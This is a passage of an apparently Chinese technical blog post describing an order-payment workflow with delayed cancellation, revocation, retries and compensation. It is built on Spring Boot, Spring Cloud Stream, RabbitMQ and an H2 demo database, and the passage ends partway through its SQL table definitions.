                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">订单支付完整闭环实现方案（反向撤销+重试+补偿）</h2>
<h3 data-id="heading-1">一、业务闭环核心流程</h3>
<p>完整的订单支付闭环需覆盖「下单→支付→反向撤销→补偿兜底→异常校验」全链路，确保任何异常场景下最终数据一致。核心流程如下：</p>
<pre><code class="hljs language-css" lang="css">graph <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[用户下单]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[创建订单（待支付）+落库]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[发送延迟取消消息（5分钟后触发）]</span>
    C --&gt; D<span class="hljs-selector-attr">[订单等待支付]</span>
    D --&gt; E{用户支付？}
    E --&gt;|否| F<span class="hljs-selector-attr">[5分钟后延迟消息触发→取消订单→释放库存]</span>
    E --&gt;|是| G<span class="hljs-selector-attr">[支付系统回调订单接口]</span>
    G --&gt; H{支付回调重试（<span class="hljs-number">3</span>次）}
    H --&gt;|失败| <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[支付系统发起退款→订单状态回滚]</span>
    H --&gt;|成功| J<span class="hljs-selector-attr">[订单系统本地事务（更新状态为已支付+落本地消息表）]</span>
    J --&gt; K<span class="hljs-selector-attr">[发送反向撤销指令（缓存订单ID）]</span>
    J --&gt; L<span class="hljs-selector-attr">[发送补偿任务消息（兜底）]</span>
    K --&gt; M<span class="hljs-selector-attr">[延迟消息消费时过滤该订单→不取消]</span>
    L --&gt; N{补偿任务执行？}
    N --&gt;|失败| O<span class="hljs-selector-attr">[Stream内置重试（3次）→失败进入死信队列→告警+人工介入]</span>
    N --&gt;|成功| <span class="hljs-selector-tag">P</span><span class="hljs-selector-attr">[补做撤销→确保订单不被取消]</span>
    <span class="hljs-selector-tag">Q</span><span class="hljs-selector-attr">[定时校验任务]</span> --&gt; R{异常订单？（已支付被取消/未支付未取消）}
    R --&gt;|是| S<span class="hljs-selector-attr">[自动补偿/人工核查]</span>
    R --&gt;|否| T<span class="hljs-selector-attr">[订单闭环完成]</span>
</code></pre>
<h3 data-id="heading-2">二、环境准备</h3>
<h4 data-id="heading-3">1. 依赖配置（pom.xml）</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span>
         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>order-pay-demo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>order-pay-demo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>订单支付闭环Demo（反向撤销+重试+补偿）<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">spring-cloud.version</span>&gt;</span>2021.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">spring-cloud.version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- Spring Boot核心 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Spring Cloud Stream RabbitMQ --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-stream-rabbit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 数据库相关（MyBatis Plus + H2内存库，无需真实MySQL） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 缓存（Caffeine） --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.ben-manes.caffeine<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>caffeine<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- 工具类 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.hutool<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hutool-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.8.22<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>${spring-cloud.version}<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">2. 核心配置（application.yml）</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span>

<span class="hljs-attr">spring:</span>
  <span class="hljs-comment"># 基础配置</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">order-pay-demo</span>
  <span class="hljs-comment"># H2内存数据库（无需真实MySQL，方便运行）</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">org.h2.Driver</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:h2:mem:order-pay-db;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">sa</span>
    <span class="hljs-attr">password:</span>
  <span class="hljs-comment"># H2控制台（访问：http://localhost:8080/h2-console）</span>
  <span class="hljs-attr">h2:</span>
    <span class="hljs-attr">console:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/h2-console</span>
  <span class="hljs-comment"># RabbitMQ配置</span>
  <span class="hljs-attr">rabbitmq:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">localhost</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span>
  <span class="hljs-comment"># Spring Cloud Stream配置</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">stream:</span>
      <span class="hljs-attr">binders:</span>
        <span class="hljs-attr">rabbit-binder:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">rabbit</span>
          <span class="hljs-attr">environment:</span>
            <span class="hljs-attr">spring:</span>
              <span class="hljs-attr">rabbitmq:</span> <span class="hljs-string">${spring.rabbitmq}</span>
      <span class="hljs-attr">bindings:</span>
        <span class="hljs-comment"># 1. 延迟取消订单：生产者（下单发送）</span>
        <span class="hljs-attr">order-delay-output:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.delay.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-delay-group</span>
          <span class="hljs-attr">producer:</span>
            <span class="hljs-attr">required-groups:</span> <span class="hljs-string">order-delay-group</span>
        <span class="hljs-comment"># 1. 延迟取消订单：消费者（5分钟后消费）</span>
        <span class="hljs-attr">order-delay-input:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.delay.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-delay-group</span>
          <span class="hljs-attr">consumer:</span>
            <span class="hljs-attr">max-attempts:</span> <span class="hljs-number">3</span>          <span class="hljs-comment"># 内置重试3次</span>
            <span class="hljs-attr">back-off:</span>
              <span class="hljs-attr">initial-interval:</span> <span class="hljs-number">1000</span> <span class="hljs-comment"># 重试间隔1秒</span>
            <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">manual</span> <span class="hljs-comment"># 手动ACK</span>
        <span class="hljs-comment"># 2. 反向撤销指令：生产者（支付成功发送）</span>
        <span class="hljs-attr">order-cancel-revoke-output:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.cancel.revoke.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-cancel-revoke-group</span>
        <span class="hljs-comment"># 2. 反向撤销指令：消费者（缓存订单ID）</span>
        <span class="hljs-attr">order-cancel-revoke-input:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.cancel.revoke.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-cancel-revoke-group</span>
          <span class="hljs-attr">consumer:</span>
            <span class="hljs-attr">max-attempts:</span> <span class="hljs-number">3</span>
            <span class="hljs-attr">back-off:</span>
              <span class="hljs-attr">initial-interval:</span> <span class="hljs-number">1000</span>
        <span class="hljs-comment"># 3. 补偿任务：生产者（支付成功发送）</span>
        <span class="hljs-attr">order-compensate-output:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.compensate.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-compensate-group</span>
        <span class="hljs-comment"># 3. 补偿任务：消费者（补做撤销）</span>
        <span class="hljs-attr">order-compensate-input:</span>
          <span class="hljs-attr">destination:</span> <span class="hljs-string">order.compensate.exchange</span>
          <span class="hljs-attr">binder:</span> <span class="hljs-string">rabbit-binder</span>
          <span class="hljs-attr">group:</span> <span class="hljs-string">order-compensate-group</span>
          <span class="hljs-attr">consumer:</span>
            <span class="hljs-attr">max-attempts:</span> <span class="hljs-number">3</span>          <span class="hljs-comment"># 补偿重试3次</span>
            <span class="hljs-attr">back-off:</span>
              <span class="hljs-attr">initial-interval:</span> <span class="hljs-number">2000</span> <span class="hljs-comment"># 重试间隔2秒</span>
            <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">manual</span>
            <span class="hljs-attr">dead-letter-queue-name:</span> <span class="hljs-string">order.compensate.dlq</span> <span class="hljs-comment"># 死信队列</span>
      <span class="hljs-comment"># RabbitMQ扩展配置（延迟队列、死信）</span>
      <span class="hljs-attr">rabbit:</span>
        <span class="hljs-attr">bindings:</span>
          <span class="hljs-attr">order-delay-input:</span>
            <span class="hljs-attr">consumer:</span>
              <span class="hljs-attr">queueNameGroupOnly:</span> <span class="hljs-literal">true</span>
              <span class="hljs-attr">arguments:</span>
                <span class="hljs-attr">x-dead-letter-exchange:</span> <span class="hljs-string">order.delay.dlq.exchange</span>
                <span class="hljs-attr">x-dead-letter-routing-key:</span> <span class="hljs-string">order.delay.dlq.key</span>
                <span class="hljs-attr">x-message-ttl:</span> <span class="hljs-number">300000</span> <span class="hljs-comment"># 延迟5分钟（300000毫秒）</span>
                <span class="hljs-attr">x-queue-mode:</span> <span class="hljs-string">lazy</span>
          <span class="hljs-attr">order-compensate-input:</span>
            <span class="hljs-attr">consumer:</span>
              <span class="hljs-attr">queueNameGroupOnly:</span> <span class="hljs-literal">true</span>
              <span class="hljs-attr">arguments:</span>
                <span class="hljs-attr">x-dead-letter-exchange:</span> <span class="hljs-string">order.compensate.dlq.exchange</span>
                <span class="hljs-attr">x-dead-letter-routing-key:</span> <span class="hljs-string">order.compensate.dlq.key</span>
                <span class="hljs-attr">x-queue-mode:</span> <span class="hljs-string">lazy</span>

<span class="hljs-comment"># MyBatis Plus配置</span>
<span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath:mapper/**/*.xml</span>

<span class="hljs-comment"># 业务配置</span>
<span class="hljs-attr">order:</span>
  <span class="hljs-attr">pay:</span>
    <span class="hljs-attr">expire-minutes:</span> <span class="hljs-number">5</span>        <span class="hljs-comment"># 支付超时5分钟</span>
    <span class="hljs-attr">callback-retry-times:</span> <span class="hljs-number">3</span>  <span class="hljs-comment"># 支付回调重试3次</span>
    <span class="hljs-attr">callback-retry-interval:</span> <span class="hljs-number">60</span> <span class="hljs-comment"># 回调重试间隔60秒</span>
  <span class="hljs-attr">compensate:</span>
    <span class="hljs-attr">check-interval:</span> <span class="hljs-number">300</span>      <span class="hljs-comment"># 定时校验间隔300秒（5分钟）</span>
</code></pre>
<h3 data-id="heading-5">三、核心代码实现</h3>
<h4 data-id="heading-6">1. 数据库表结构（H2自动创建）</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 订单表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `t_order` (
  `id` <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
  `order_no` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'订单编号'</span>,
  `user_id` <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'用户ID'</span>,
  `amount` <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'订单金额'</span>,
  `status` TINYINT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0-待支付 1-已支付 2-已取消 3-已退款'</span>,
  `create_time` DATETIME <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  `update_time` DATETIME <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_order_no` (`order_no`)
);

<span class="hljs-comment">-- 本地消息表（最终一致性）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `t_local_message` (
  `id` <span class="hljs-type">BIGINT</span> AUTO_INCREMENT <span class="hljs-keyword">PRIMARY</span> KEY,
  `message_type` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'消息类型：ORDER_PAY_CANCEL_DELAY'</span>,
  `business_id` <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'业务ID（订单ID）'</span>,
  `message_content` <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'消息内容'</span>,
  `status` TINYINT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0-待处理 1-处理中 2-已完成 3-失败'</span>,
  `retry_count` TINYINT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'重试次数'</span>,
